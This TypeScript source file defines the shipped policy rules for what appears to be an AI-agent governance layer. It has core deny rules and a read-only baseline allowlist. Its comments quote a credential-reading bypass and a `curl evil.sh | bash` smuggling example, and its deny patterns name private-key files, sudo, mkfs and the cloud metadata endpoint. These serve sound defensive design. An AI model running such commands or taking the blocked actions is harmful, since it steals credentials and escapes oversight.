// The rules an installation ships with.
//
// Three tiers, following the supervisor's design (see docs-notes/BASELINE-RULES.md
// for the full rationale and the rule-by-rule justification):
//
//   core      immutable denials, enforced at all times, not editable at runtime
//   baseline  shipped allowances that make an agent usable on first boot
//   admin     everything an operator adds afterwards, from observed behaviour
//
// **Why this replaces monitor-as-the-default.** A fresh installation used to
// start in observe-only, because `enforce` with an empty allowlist refuses every
// action and an unusable control gets switched off wholesale. The cost was that
// the shipped default did not restrict anything, which is a poor match for a
// system whose stated posture is default-deny. Shipping a starting policy solves
// the same problem the other way round: the agent works immediately *and* is
// restricted immediately.
//
// **The security argument for commands is the allowlist, not the denylist.**
// Worth being explicit, because it is easy to read the core denials as the
// protection. They are not. A shell can reach a forbidden file through
// indirection no pattern will catch — `c""at $HOME/.ssh/id_rsa`, a variable, a
// script, base64. Enumerating bad commands is a losing game. What actually
// confines the agent is that the baseline *allows* a short list of anchored,
// argument-constrained commands and denies everything else by default. The core
// denials are defence in depth against a careless later rule, not a boundary
// that stands on its own.
import type { PolicyRule } from "./policy-types.js";

/** A shipped rule, before ids and timestamps are attached. */
export type SeedRule = Omit<PolicyRule, "id" | "createdAt">;

/**
 * Matches a path that resolved to somewhere **outside** the workspace.
 *
 * Leans on the canonical form established in path-normalize.ts: a path inside
 * the workspace is rendered workspace-relative, and anything else is rendered
 * absolute. So "outside the project" is exactly "starts with `/`, or with a
 * Windows drive letter" — no traversal check, no denylist of parent
 * directories. The property falls out of the representation.
 */
const OUTSIDE_WORKSPACE = "^([A-Za-z]:/|/)";

/**
 * Credential material, wherever it appears.
 *
 * Deliberately matched by filename rather than by location: a private key
 * copied into the project directory is still a private key, and a rule keyed to
 * `~/.ssh` alone would wave it through.
 */
const CREDENTIAL_FILES =
  "(^|/)(\\.env(\\.[A-Za-z0-9_-]+)?|\\.npmrc|\\.git-credentials|\\.netrc|" +
  "id_rsa|id_dsa|id_ecdsa|id_ed25519|.*\\.pem|.*\\.pfx|.*\\.p12|.*\\.keystore)$";

/** Directories whose entire contents are credential material. */
const CREDENTIAL_DIRS = "(^|/)(\\.ssh|\\.aws|\\.gnupg|\\.docker|\\.kube)/";

/**
 * The governance layer's own state.
 *
 * The policy, the accounts, the audit ledger, its signing key and its
 * checkpoint. An agent able to write here could grant itself permissions or
 * erase the record of having done so, which would make every other guarantee
 * in this system conditional on the agent choosing not to.
 */
const GOVERNANCE_STATE = "(^|/)\\.openclaw/governance(/|$)";

/**
 * Rules that are always in force and cannot be changed at runtime.
 *
 * Two properties distinguish these from every other rule:
 *
 *   1. **Deny wins.** They are consulted before allow rules and cannot be
 *      overridden by one, so a later broad grant cannot re-open them.
 *   2. **They bind under `monitor` too.** Monitor suspends policy *opinions*;
 *      these are the restrictions the installation is unwilling to merely have
 *      an opinion about. Without this, enabling monitor on an agent would be a
 *      one-click way to lift every protection here.
 *
 * Reasserted from this file on every load, so editing `policy.json` by hand
 * cannot remove them.
 */
export const CORE_RULES: readonly SeedRule[] = Object.freeze([
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: CREDENTIAL_FILES,
    description: "Credential files (.env, private keys, .npmrc, .netrc) — read or write",
  },
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: CREDENTIAL_DIRS,
    description: "Credential directories (.ssh, .aws, .gnupg, .docker, .kube)",
  },
  {
    resourceKind: "path",
    effect: "deny",
    tier: "core",
    pattern: GOVERNANCE_STATE,
    description: "The governance layer's own policy, accounts, audit ledger and signing key",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    // Backstop only — see the file header. The real protection against these is
    // that the baseline allowlist does not permit a shell in the first place.
    pattern: "(^|[;&|]\\s*)(sudo|su|doas|runas|pkexec)\\b",
    description: "Privilege escalation (sudo, su, doas, runas, pkexec)",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    pattern: "\\.openclaw/governance",
    description: "Any command naming the governance state directory",
  },
  {
    resourceKind: "command",
    effect: "deny",
    tier: "core",
    pattern: "(^|[;&|]\\s*)(shutdown|reboot|halt|poweroff|mkfs|fdisk)\\b",
    description: "Host destruction and shutdown",
  },
  {
    resourceKind: "network",
    effect: "deny",
    tier: "core",
    // The cloud instance metadata service. Reaching it from a compromised
    // workload is the standard route to stealing a machine's cloud
    // credentials, and no legitimate agent task needs it.
    pattern: "^(169\\.254\\.169\\.254|metadata\\.google\\.internal)$",
    description: "Cloud instance metadata endpoints (credential theft route)",
  },
]);

/**
 * Rules shipped so an agent can do ordinary work on first boot.
 *
 * Unlike core rules these are a **starting point**: an Administrator may remove
 * or narrow any of them. They are the answer to "what does an agent need in
 * order to be useful before anybody has written a policy?", and the answer is
 * kept deliberately small — read the project, look around the filesystem inside
 * it, and run a handful of read-only inspection commands.
 *
 * Every command pattern is fully anchored and excludes shell metacharacters, so
 * a permitted command cannot become a carrier for an arbitrary one. `^ls$` is
 * safe; `ls` would allow `curl evil.sh | bash; ls`.
 */
export const BASELINE_RULES: readonly SeedRule[] = Object.freeze([
  {
    resourceKind: "path",
    effect: "allow",
    tier: "baseline",
    // **Read only.** The brief describes a baseline that permits "reading
    // permitted project files", and until the access dimension existed this
    // rule granted writes as well — quietly more permissive than the design it
    // was implementing.
    //
    // Modifying the project is a deliberate grant an operator makes, not
    // something an agent should inherit from a default. Without one, a write
    // inside the workspace escalates to a human (or is refused outright under a
    // strict `ask`), which is the correct treatment for an action that changes
    // state on first contact.
    access: "read",
    // Anything the canonical form rendered workspace-relative — i.e. inside the
    // project. Core denials still apply on top, so a `.env` in the project is
    // matched here and refused there.
    pattern: `^(?!${OUTSIDE_WORKSPACE.slice(1)}).+$`,
    description: "Reading files inside the workspace (core denials still apply)",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^(ls|pwd|whoami|date|uname)$",
    description: "Bare inspection commands with no arguments",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    // Arguments limited to a safe character set: no shell metacharacters, so
    // the argument cannot smuggle a second command.
    pattern: "^ls( -[a-zA-Z]{1,8})?( [A-Za-z0-9._/-]{1,200})?$",
    description: "Directory listing with simple flags and one plain path",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    // Split into "no flag" and "one flag" rather than allowing a repeated
    // optional group: `( --[a-z-]{1,20}){0,3}` nests a quantifier inside a
    // quantified group, which this project's own regex-safety check rejects as
    // a backtracking risk. The shipped rules are held to the same standard as
    // an operator's, which is the point — a validator the defaults would fail
    // is a validator nobody believes.
    pattern: "^git (status|branch|diff|log)$",
    description: "Read-only git inspection",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^git (status|branch|diff|log) --[a-z-]{1,20}$",
    description: "Read-only git inspection with a single flag",
  },
  {
    resourceKind: "command",
    effect: "allow",
    tier: "baseline",
    pattern: "^(node|npm|pnpm|python|python3|git) --version$",
    description: "Tool version checks",
  },
]);

/** Every shipped rule, core first. */
export function seedRules(): readonly SeedRule[] {
  return [...CORE_RULES, ...BASELINE_RULES];
}

/**
 * True for a rule the installation shipped with, rather than one an operator
 * wrote.
 *
 * Exported because the distinction matters in three places: the dashboard shows
 * shipped rules differently, the CLI marks them, and tests asserting "the
 * policy contains exactly the rules I added" need to exclude them without
 * hard-coding how many there are.
 */
export function isShippedRule(rule: { tier?: string; createdBy?: string }): boolean {
  return rule.tier === "core" || rule.tier === "baseline" || rule.createdBy === "system";
}

/** Stable id for a shipped rule, so re-seeding never duplicates it. */
export function seedRuleId(rule: SeedRule): string {
  const slug = rule.description
    ?.toLowerCase()
    .replaceAll(/[^a-z0-9]+/g, "-")
    .replaceAll(/^-|-$/g, "")
    .slice(0, 48);
  return `${rule.tier}-${rule.resourceKind}-${slug || "rule"}`;
}
